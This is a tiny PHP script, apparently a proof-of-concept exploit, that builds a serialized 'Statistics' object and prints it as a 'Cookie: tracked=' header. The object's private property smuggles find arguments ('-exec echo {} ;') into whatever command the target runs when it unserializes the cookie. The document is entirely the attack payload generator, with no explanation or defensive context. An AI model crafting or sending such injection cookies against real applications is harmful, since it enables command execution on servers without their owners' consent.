<?php

class Statistics {

    private $counter_output_path = ". -name *.php -exec echo {} ;";
}


echo "Cookie: tracked=" . urlencode(serialize(new Statistics())) . "\n";